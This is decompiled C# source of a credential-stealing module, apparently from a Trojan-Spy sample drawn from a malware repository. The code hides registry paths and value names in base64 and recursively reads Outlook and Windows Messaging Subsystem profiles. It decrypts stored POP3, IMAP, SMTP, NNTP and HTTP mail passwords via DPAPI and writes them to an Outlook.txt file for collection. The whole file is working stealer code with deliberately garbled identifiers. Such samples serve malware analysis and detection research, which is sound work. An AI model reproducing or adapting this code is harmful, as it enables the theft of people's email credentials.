// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.Outlook
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace AlphaCentavr
{
  internal class Outlook
  {
    private static Regex maitlCtlienttt = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
    private static Regex snnnmpnnntClinnnnennt = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");

    private static string spazma(string ddddddddddddddddddsffsfs) => Encoding.ASCII.GetString(Convert.FromBase64String(ddddddddddddddddddsffsfs));

    public static void GraxxxxbOuvtldxovok(string fffffffffffffffffffffffff)
    {
      string str = "";
      string[] strArray = new string[4]
      {
        Outlook.spazma("U29mdHdhcmVcXE1pY3Jvc29mdFxcT2ZmaWNlXFwxNS4wXFxPdXRsb29rXFxQcm9maWxlc1xcT3V0bG9va1xcOTM3NUNGRjA0MTMxMTFkM0I4OEEwMDEwNEIyQTY2NzY="),
        Outlook.spazma("U29mdHdhcmVcXE1pY3Jvc29mdFxcT2ZmaWNlXFwxNi4wXFxPdXRsb29rXFxQcm9maWxlc1xcT3V0bG9va1xcOTM3NUNGRjA0MTMxMTFkM0I4OEEwMDEwNEIyQTY2NzY="),
        Outlook.spazma("U29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmRvd3MgTWVzc2FnaW5nIFN1YnN5c3RlbVxcUHJvZmlsZXNcXE91dGxvb2tcXDkzNzVDRkYwNDEzMTExZDNCODhBMDAxMDRCMkE2Njc2"),
        Outlook.spazma("U29mdHdhcmVcXE1pY3Jvc29mdFxcV2luZG93cyBNZXNzYWdpbmcgU3Vic3lzdGVtXFxQcm9maWxlc1xcOTM3NUNGRjA0MTMxMTFkM0I4OEEwMDEwNEIyQTY2NzY=")
      };
      string[] clirrrentys = new string[28]
      {
        Outlook.spazma("U01UUCBFbWFpbCBBZGRyZXNz"),
        Outlook.spazma("U01UUCBTZXJ2ZXI="),
        Outlook.spazma("UE9QMyBTZXJ2ZXI="),
        Outlook.spazma("UE9QMyBVc2VyIE5hbWU="),
        Outlook.spazma("U01UUCBVc2VyIE5hbWU="),
        Outlook.spazma("Tk5UUCBFbWFpbCBBZGRyZXNz"),
        Outlook.spazma("Tk5UUCBVc2VyIE5hbWU="),
        Outlook.spazma("Tk5UUCBTZXJ2ZXI="),
        Outlook.spazma("SU1BUCBTZXJ2ZXI="),
        Outlook.spazma("SU1BUCBVc2VyIE5hbWU="),
        Outlook.spazma("RW1haWw="),
        Outlook.spazma("SFRUUCBVc2Vy"),
        Outlook.spazma("SFRUUCBTZXJ2ZXIgVVJM"),
        Outlook.spazma("UE9QMyBVc2Vy"),
        Outlook.spazma("SU1BUCBVc2Vy"),
        Outlook.spazma("SFRUUE1haWwgVXNlciBOYW1l"),
        Outlook.spazma("SFRUUE1haWwgU2VydmVy"),
        Outlook.spazma("U01UUCBVc2Vy"),
        Outlook.spazma("UE9QMyBQYXNzd29yZDI="),
        Outlook.spazma("SU1BUCBQYXNzd29yZDI="),
        Outlook.spazma("Tk5UUCBQYXNzd29yZDI="),
        Outlook.spazma("SFRUUE1haWwgUGFzc3dvcmQy"),
        Outlook.spazma("U01UUCBQYXNzd29yZDI="),
        Outlook.spazma("UE9QMyBQYXNzd29yZA=="),
        Outlook.spazma("SU1BUCBQYXNzd29yZA=="),
        Outlook.spazma("Tk5UUCBQYXNzd29yZA=="),
        Outlook.spazma("SFRUUE1haWwgUGFzc3dvcmQ="),
        Outlook.spazma("U01UUCBQYXNzd29yZA==")
      };
      foreach (string paffffffffffth in strArray)
        str += Outlook.Get(paffffffffffth, clirrrentys);
      if (string.IsNullOrEmpty(str))
        return;
      ChelovechkivPope.Outlook = true;
      Directory.CreateDirectory(fffffffffffffffffffffffff);
      File.WriteAllText(fffffffffffffffffffffffff + Outlook.spazma("XFxPdXRsb29rLnR4dA=="), str + "\r\n");
    }

    private static string Get(string paffffffffffth, string[] clirrrentys)
    {
      string str = "";
      try
      {
        foreach (string clirrrenty in clirrrentys)
        {
          try
          {
            object infoFromRegistry = Outlook.GetInfoFromRegistry(paffffffffffth, clirrrenty);
            if (infoFromRegistry != null && clirrrenty.Contains(Outlook.spazma("UGFzc3dvcmQ=")) && !clirrrenty.Contains("2"))
              str = str + clirrrenty + ": " + Outlook.DecryptValue((byte[]) infoFromRegistry) + "\r\n";
            else if (Outlook.snnnmpnnntClinnnnennt.IsMatch(infoFromRegistry.ToString()) || Outlook.maitlCtlienttt.IsMatch(infoFromRegistry.ToString()))
              str += string.Format("{0}: {1}\r\n", (object) clirrrenty, infoFromRegistry);
            else
              str = str + clirrrenty + ": " + Encoding.UTF8.GetString((byte[]) infoFromRegistry).Replace(Convert.ToChar(0).ToString(), "") + "\r\n";
          }
          catch
          {
          }
        }
        foreach (string subKeyName in Registry.CurrentUser.OpenSubKey(paffffffffffth, false).GetSubKeyNames())
          str += Outlook.Get(paffffffffffth + "\\" + subKeyName, clirrrentys);
      }
      catch
      {
      }
      return str;
    }

    private static object GetInfoFromRegistry(string pdddath, string valueName)
    {
      object infoFromRegistry = (object) null;
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(pdddath, false);
        infoFromRegistry = registryKey.GetValue(valueName);
        registryKey.Close();
      }
      catch
      {
      }
      return infoFromRegistry;
    }

    private static string DecryptValue(byte[] encrypted)
    {
      try
      {
        byte[] numArray = new byte[checked (encrypted.Length - 1)];
        Buffer.BlockCopy((Array) encrypted, 1, (Array) numArray, 0, checked (encrypted.Length - 1));
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(numArray, (byte[]) null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
      }
      catch
      {
      }
      return "null";
    }
  }
}
